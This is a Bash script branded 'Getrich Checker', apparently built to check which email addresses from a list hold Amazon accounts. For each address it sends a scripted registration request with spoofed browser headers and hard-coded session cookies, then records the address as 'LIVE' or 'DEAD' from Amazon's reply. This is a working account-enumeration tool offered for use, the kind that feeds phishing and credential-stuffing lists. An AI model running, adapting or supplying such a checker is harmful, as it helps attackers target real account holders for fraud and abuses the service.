#!/bin/bash
RED='\e[31m'
CYAN='\e[36m'
YELLOW='\e[33m'
ORANGE='\e[33m' 
PUR='\033[35m'
GRN="\e[32m"
WHI="\e[37m"
NC='\e[0m'
printf "$NC\n"
echo ""
 
banner()
{
echo -e "$CYAN         #################################### "
echo -e "$CYAN         #################################### "
echo -e "$CYAN         #######    Getrich Checker   ####### "
echo -e "$NC         #######                      ####### "
echo -e "$NC         #######   amzon Valid eMail  ####### "
echo -e "$PUR         ###############      ############### "
echo -e "$PUR         ###############      ############### "
echo -e "$RED         ###### ########      ######## ###### "
echo -e "$RED         ###############      ############### "
echo -e "$RED         ###############      ############### "
echo -e "$WHI         ###############      ############### "
echo -e "$WHI         ------------------------------------ "
echo -e "$NC                 Happy Checking Maleng "
echo -e "$CYAN         ------------------------------------ "
echo -e "$NC"
                              
}

banner
while getopts ":i:r:l:t:dchu" o; do
    case "${o}" in
        i)
            list=${OPTARG}
            ;;
        r)
            folderto=${OPTARG}
            ;;
        l)
            listto=${OPTARG}
            ;;
        d)
            hapud='y'
            ;;
    esac
done
if [[ $list == '' || $folderto == '' || $listto == '' ]]; then
  cli_mode="interactive"
else
  cli_mode="interpreter"
fi
if [ -z "${hapud}" ]; then
  hapud='n'
fi
SECONDS=0
if [[ $list == '' ]]; then
  printf "$GRN"
  printf "$NC"
  read -p "list name/path to list : " list
fi
if [[ $folderto == '' ]]; then
  read -p "save to folder : " folderto
  # Check if result folder exists
  # then create if it didn't
  if [[ ! -d "$folderto" ]]; then
    mkdir $folderto
  else
    read -p "folder are exists, append to them (y/n) ? " isAppend
    if [[ $isAppend == 'n' ]]; then
      exit
    fi
  fi
else
  if [[ ! -d "$folderto" ]]; then
    mkdir $folderto
  fi
fi
if [[ $hapud == '' || $cli_mode == 'interactive' ]]; then
  read -p "delete list per check (y/n) : " hapud
fi
checkapple() {
SECONDS=0
random=$(echo $(shuf -i 0-999999 -n 1))
check=$(curl -s --compressed --cookie tmp/${random}_tmp "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue" -L \
-H 'Accept-Encoding: gzip, deflate, br' \
-H 'User-Agent: Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
-H 'Accept-Language: en-US,en;q=0.5' \
-H 'Referer: https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue' \
-H 'Connection: keep-alive' \
-H 'Cookie: signin-sso-state-gb=68af81b6-f2e1-4fc1-84cc-5ccb355e13f8; signin-sso-state-us=c514c99a-c9a9-4b40-bd77-3b71ad10971c; session-id-time=2082787201l; csm-hit=tb:1X2XP2EDDBANB11DMZBF+s-1X2XP2EDDBANB11DMZBF|1544022644429&adb:adblk_yes; x-wl-uid=10B6/BW1iauW2GPLx9yQP4TquGxVxhEVG3Jk1XDJMorKa2rJiCsw6oLK+pDXAOsfDXjK4rUyVNKPIZZ+FtJu8tzqw6vLEWluTgQjt2GBuMqH69JD//bxCRPIOUF3dqjehLzhP/zR8zkc=; s_fid=54122617D04D1290-199EF4CD31D92B3E; aws-priv=eyJ2IjoxLCJldSI6MCwic3QiOjB9; aws-target-static-id=1541853962140-213532; aws-target-visitor-id=1541853962143-95606.29_16; aws-target-data=%7B%22support%22%3A%221%22%7D; s_dslv=1543517049851; s_vn=1573389962413%26vn%3D3; s_nr=1543517049852-Repeat; regStatus=registering; kdp-lc-main=en_US; session-id-time-eu=2173190960l; ubid-acbuk=261-2892225-0617732; session-id=146-2705796-3878048; ubid-main=131-8702790-5409164; aws-business-metrics-last-visit=1542471194212; aws-ubid-main=585-0757036-2337346; session-token="R2eMQQW6YF3RQKBLm8DDgsTmXqvFeyzWboUEpK/So2hGpjbVq1rVAQO/9j8ujeFhRqkdf8yPba7hnoAsWiYvf4rWK8uSby9xsj3XIIR/8FF2FgAtXAnwGHgN1jfswMqE9mQgA3vBlNT7zXUSZvDJIYamq+X5FMjb0bYkLTzU70dwXzE0qfNaHoaSb0A9244uUM9gciXORHW8Jq3vSCdk+w=="; sst-main=Sst1|PQFI-dkfYKt6H3H9L0PZV6pyC3_xQ0JM_Bz7yMbeqBD18TA8zXL5TqFoe-WlaoIMqio2K8E2WfN-QuDJd3fRpvNT_DPn0V30U5TrghDlajgS6ZvAK27rW8VJXJWP0VeBrEO1nXTQX8D3OQh88KQmWd_bUTbV4TYtc4NwcjYQGvfW0vzF-8RmG8QvE8GvD088gVuRQoWnkMrzvFpVxvzP_GfANpB5S9rqeHIInjtxPJ4UkhdqHi6AucB6q625Lv3DC7ECL-Jk9ilDpKRKirfTfZJcQERfxloDXK3aq05jK1ZgqXKVKXdsGDDMHccYxpWW8fvvCZZ0PWozV6VF-Y2qnNMd_g' \
--data "customerName=goblogsia&email=$1&emailCheck=$1&password=kontol1234a&passwordCheck=kontol1234a")
duration=$SECONDS
header="GetRich:Re ~ date +%H:%M:%S"
footer="[GetRich:Re ~ Amazon Validator 2019]\n"
  
  if [[ $check =~ "You indicated you are a new customer, but an account already exists with the e-mail" ]]; then
    echo -n -e "[$header ~ [$2/$3] ] ${ORANGE}$b LIVE ${NC} => $1 $footer"
    echo "$1" >> $4/live.txt
  else
      echo -n -e "[$header ~ [$2/$3] ] ${RED}$b DEAD ${NC} => $1 $footer"
      echo "$1" >> $4/Die.txt
fi
  printf "\r"
  }
if [[ ! -f $list ]]; then
  echo "[!] mailist not found. check your mailist file name."
  ls -l
  exit
fi
echo "Preparing check Please Wait ......"
linetotalsal=`grep -c "@" $list`
IFS=$'\r\n' GLOBIGNORE='*' command eval  'mailist=($(cat $list))'
con=1

for (( i = 0; i < "${#mailist[@]}"; i++ )); do
  sleep .2
  nameu="${mailist[$i]}"
  indx=$((con++))
  totals=$((linetotalsal--))
  fold=`expr $i`
  if [[ $fold == 0 && $i > 0 ]]; then
    header="date +%H:%M:%S"
    duration=$SECONDS
  fi
  checkapple "$nameu" "$indx" "$totals" "$folderto" "$list" &
  if [[ $hapud == 'y' ]]; then
    grep -v -- "$nameu" $list > "$list"_temp && mv "$list"_temp $list
  fi
done 
echo "\n"
wait
#rm $list
duration=$SECONDS
echo "$(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed."
